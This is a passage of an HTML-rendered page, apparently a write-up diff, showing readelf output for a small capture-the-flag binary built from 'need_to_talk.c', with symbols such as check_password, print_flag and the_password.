+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 0x0000000000000000 0x0000000000000000  RW     0x10
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  GNU_RELRO      0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 0x0000000000000218 0x0000000000000218  R      0x1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Section to Segment mapping:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Segment Sections...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   00     
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   01     .interp 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   02     .interp .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   03     .init .plt .plt.got .text .fini 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   04     .rodata .eh_frame_hdr .eh_frame 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   05     .init_array .fini_array .dynamic .got .got.plt .data .bss 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   06     .dynamic 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   07     .note.gnu.build-id .note.ABI-tag 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   08     .eh_frame_hdr 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   09     
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   10     .init_array .fini_array .dynamic .got 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Dynamic section at offset 0x2df8 contains 26 entries:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Tag        Type                         Name/Value
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x000000000000000c (INIT)               0x1000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x000000000000000d (FINI)               0x1424
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x0000000000000019 (INIT_ARRAY)         0x3de8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x000000000000001a (FINI_ARRAY)         0x3df0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x000000006ffffef5 (GNU_HASH)           0x308
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x0000000000000005 (STRTAB)             0x500
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x0000000000000006 (SYMTAB)             0x338
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x000000000000000a (STRSZ)              204 (bytes)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x000000000000000b (SYMENT)             24 (bytes)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x0000000000000015 (DEBUG)              0x0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x0000000000000003 (PLTGOT)             0x4000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x0000000000000002 (PLTRELSZ)           264 (bytes)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x0000000000000014 (PLTREL)             RELA
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x0000000000000017 (JMPREL)             0x768
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x0000000000000007 (RELA)               0x618
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x0000000000000008 (RELASZ)             336 (bytes)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x0000000000000009 (RELAENT)            24 (bytes)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x000000006ffffffb (FLAGS_1)            Flags: PIE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x000000006ffffffe (VERNEED)            0x5f8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x000000006fffffff (VERNEEDNUM)         1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x000000006ffffff0 (VERSYM)             0x5cc
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x000000006ffffff9 (RELACOUNT)          7
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 0x0000000000000000 (NULL)               0x0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Relocation section &#39;</span>.rela.dyn<span style="color:#e6db74">&#39; at offset 0x618 contains 14 entries:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Offset          Info           Type           Sym. Value    Sym. Name + Addend
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000003de8  000000000008 R_X86_64_RELATIVE                    11d0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000003df0  000000000008 R_X86_64_RELATIVE                    1190
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004078  000000000008 R_X86_64_RELATIVE                    4078
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004080  000000000008 R_X86_64_RELATIVE                    2008
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004090  000000000008 R_X86_64_RELATIVE                    2018
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004098  000000000008 R_X86_64_RELATIVE                    2040
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0000000040a0  000000000008 R_X86_64_RELATIVE                    2098
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000003fd8  000300000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000003fe0  000800000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000003fe8  000b00000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000003ff0  000d00000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000003ff8  001100000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0000000040b0  001000000005 R_X86_64_COPY     00000000000040b0 stdout@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0000000040c0  001200000005 R_X86_64_COPY     00000000000040c0 stdin@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Relocation section &#39;</span>.rela.plt<span style="color:#e6db74">&#39; at offset 0x768 contains 11 entries:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Offset          Info           Type           Sym. Value    Sym. Name + Addend
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 free@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 putchar@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004028  000400000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004030  000500000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004038  000600000007 R_X86_64_JUMP_SLO 0000000000000000 setbuf@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004040  000700000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004048  000900000007 R_X86_64_JUMP_SLO 0000000000000000 fgets@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004050  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 strcmp@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004058  000c00000007 R_X86_64_JUMP_SLO 0000000000000000 malloc@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004060  000e00000007 R_X86_64_JUMP_SLO 0000000000000000 sleep@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">000000004068  000f00000007 R_X86_64_JUMP_SLO 0000000000000000 usleep@GLIBC_2.2.5 + 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">No processor specific unwind information to decode
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Symbol table &#39;</span>.dynsym<span style="color:#e6db74">&#39; contains 19 entries:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   Num:    Value          Size Type    Bind   Vis      Ndx Name
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     3: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fgets@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    11: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    13: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    14: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sleep@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    15: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    16: 00000000000040b0     8 OBJECT  GLOBAL DEFAULT   25 [...]@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    17: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    18: 00000000000040c0     8 OBJECT  GLOBAL DEFAULT   25 stdin@GLIBC_2.2.5 (2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Symbol table &#39;</span>.symtab<span style="color:#e6db74">&#39; contains 83 entries:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   Num:    Value          Size Type    Bind   Vis      Ndx Name
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     1: 00000000000002a8     0 SECTION LOCAL  DEFAULT    1 .interp
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     2: 00000000000002c4     0 SECTION LOCAL  DEFAULT    2 .note.gnu.build-id
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     3: 00000000000002e8     0 SECTION LOCAL  DEFAULT    3 .note.ABI-tag
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     4: 0000000000000308     0 SECTION LOCAL  DEFAULT    4 .gnu.hash
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     5: 0000000000000338     0 SECTION LOCAL  DEFAULT    5 .dynsym
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     6: 0000000000000500     0 SECTION LOCAL  DEFAULT    6 .dynstr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     7: 00000000000005cc     0 SECTION LOCAL  DEFAULT    7 .gnu.version
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     8: 00000000000005f8     0 SECTION LOCAL  DEFAULT    8 .gnu.version_r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     9: 0000000000000618     0 SECTION LOCAL  DEFAULT    9 .rela.dyn
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    10: 0000000000000768     0 SECTION LOCAL  DEFAULT   10 .rela.plt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    11: 0000000000001000     0 SECTION LOCAL  DEFAULT   11 .init
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    12: 0000000000001020     0 SECTION LOCAL  DEFAULT   12 .plt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    13: 00000000000010e0     0 SECTION LOCAL  DEFAULT   13 .plt.got
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    14: 00000000000010f0     0 SECTION LOCAL  DEFAULT   14 .text
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    15: 0000000000001424     0 SECTION LOCAL  DEFAULT   15 .fini
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    16: 0000000000002000     0 SECTION LOCAL  DEFAULT   16 .rodata
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    17: 0000000000002150     0 SECTION LOCAL  DEFAULT   17 .eh_frame_hdr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    18: 00000000000021b0     0 SECTION LOCAL  DEFAULT   18 .eh_frame
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    19: 0000000000003de8     0 SECTION LOCAL  DEFAULT   19 .init_array
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    20: 0000000000003df0     0 SECTION LOCAL  DEFAULT   20 .fini_array
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    21: 0000000000003df8     0 SECTION LOCAL  DEFAULT   21 .dynamic
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    22: 0000000000003fd8     0 SECTION LOCAL  DEFAULT   22 .got
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    23: 0000000000004000     0 SECTION LOCAL  DEFAULT   23 .got.plt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    24: 0000000000004070     0 SECTION LOCAL  DEFAULT   24 .data
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    25: 00000000000040b0     0 SECTION LOCAL  DEFAULT   25 .bss
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    26: 0000000000000000     0 SECTION LOCAL  DEFAULT   26 .comment
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    27: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    28: 0000000000001120     0 FUNC    LOCAL  DEFAULT   14 deregister_tm_clones
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    29: 0000000000001150     0 FUNC    LOCAL  DEFAULT   14 register_tm_clones
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    30: 0000000000001190     0 FUNC    LOCAL  DEFAULT   14 __do_global_dtors_aux
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    31: 00000000000040c8     1 OBJECT  LOCAL  DEFAULT   25 completed.7452
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    32: 0000000000003df0     0 OBJECT  LOCAL  DEFAULT   20 __do_global_dtor[...]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    33: 00000000000011d0     0 FUNC    LOCAL  DEFAULT   14 frame_dummy
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    34: 0000000000003de8     0 OBJECT  LOCAL  DEFAULT   19 __frame_dummy_in[...]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    35: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS need_to_talk.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    36: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    37: 0000000000002334     0 OBJECT  LOCAL  DEFAULT   18 __FRAME_END__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    38: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    39: 0000000000003df0     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_end
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    40: 0000000000003df8     0 OBJECT  LOCAL  DEFAULT   21 _DYNAMIC
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    41: 0000000000003de8     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_start
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    42: 0000000000002150     0 NOTYPE  LOCAL  DEFAULT   17 __GNU_EH_FRAME_HDR
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    43: 0000000000004000     0 OBJECT  LOCAL  DEFAULT   23 _GLOBAL_OFFSET_TABLE_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    44: 0000000000001000     0 FUNC    LOCAL  DEFAULT   11 _init
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    45: 0000000000001420     1 FUNC    GLOBAL DEFAULT   14 __libc_csu_fini
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    46: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    47: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND putchar@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    48: 000000000000122d   101 FUNC    GLOBAL DEFAULT   14 print_intro
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    49: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    50: 00000000000040b0     8 OBJECT  GLOBAL DEFAULT   25 stdout@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    51: 0000000000004070     0 NOTYPE  WEAK   DEFAULT   24 data_start
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    52: 00000000000020bc     4 OBJECT  GLOBAL DEFAULT   16 sleep_delay
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    54: 00000000000040c0     8 OBJECT  GLOBAL DEFAULT   25 stdin@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    55: 00000000000040a8     0 NOTYPE  GLOBAL DEFAULT   24 _edata
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    56: 0000000000001424     0 FUNC    GLOBAL HIDDEN    15 _fini
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    57: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    58: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    59: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    60: 0000000000001292    87 FUNC    GLOBAL DEFAULT   14 slow_type
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    61: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    62: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fgets@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    63: 0000000000004070     0 NOTYPE  GLOBAL DEFAULT   24 __data_start
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    64: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcmp@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    65: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    66: 0000000000004078     0 OBJECT  GLOBAL HIDDEN    24 __dso_handle
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    67: 0000000000002000     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    68: 00000000000013c0    93 FUNC    GLOBAL DEFAULT   14 __libc_csu_init
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    69: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND malloc@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    70: 00000000000040d0     0 NOTYPE  GLOBAL DEFAULT   25 _end
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    71: 00000000000010f0    43 FUNC    GLOBAL DEFAULT   14 _start
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    72: 00000000000040a8     0 NOTYPE  GLOBAL DEFAULT   25 __bss_start
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    73: 00000000000011d5    88 FUNC    GLOBAL DEFAULT   14 main
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    74: 0000000000004090    24 OBJECT  GLOBAL DEFAULT   24 dialogs
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    75: 00000000000012e9   125 FUNC    GLOBAL DEFAULT   14 check_password
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    76: 0000000000001366    77 FUNC    GLOBAL DEFAULT   14 print_flag
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    77: 00000000000040a8     0 OBJECT  GLOBAL HIDDEN    24 __TMC_END__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    78: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    79: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sleep@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    80: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@@[...]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    81: 0000000000004080     8 OBJECT  GLOBAL DEFAULT   24 the_password
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    82: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND usleep@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Histogram for `.gnu.hash&#39;</span> bucket list length <span style="color:#f92672">(</span>total of <span style="color:#ae81ff">3</span> buckets<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span> Length  Number     % of total  Coverage
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span>          <span style="color:#f92672">(</span> 33.3%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">1</span>          <span style="color:#f92672">(</span> 33.3%<span style="color:#f92672">)</span>     33.3%
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">1</span>          <span style="color:#f92672">(</span> 33.3%<span style="color:#f92672">)</span>    100.0%
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version symbols section <span style="color:#e6db74">&#39;.gnu.version&#39;</span> contains <span style="color:#ae81ff">19</span> entries:
+</span></span><span style="display:flex;"><span> Addr: 0x00000000000005cc  Offset: 0x000005cc  Link: <span style="color:#ae81ff">5</span> <span style="color:#f92672">(</span>.dynsym<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  000:   <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>*local*<span style="color:#f92672">)</span>       <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>   <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>*local*<span style="color:#f92672">)</span>    
+</span></span><span style="display:flex;"><span>  004:   <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  008:   <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>   <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>*local*<span style="color:#f92672">)</span>    
+</span></span><span style="display:flex;"><span>  00c:   <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>   <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>*local*<span style="color:#f92672">)</span>       <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  010:   <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>   <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>GLIBC_2.2.5<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version needs section <span style="color:#e6db74">&#39;.gnu.version_r&#39;</span> contains <span style="color:#ae81ff">1</span> entry:
+</span></span><span style="display:flex;"><span> Addr: 0x00000000000005f8  Offset: 0x000005f8  Link: <span style="color:#ae81ff">6</span> <span style="color:#f92672">(</span>.dynstr<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  000000: Version: <span style="color:#ae81ff">1</span>  File: libc.so.6  Cnt: <span style="color:#ae81ff">1</span>
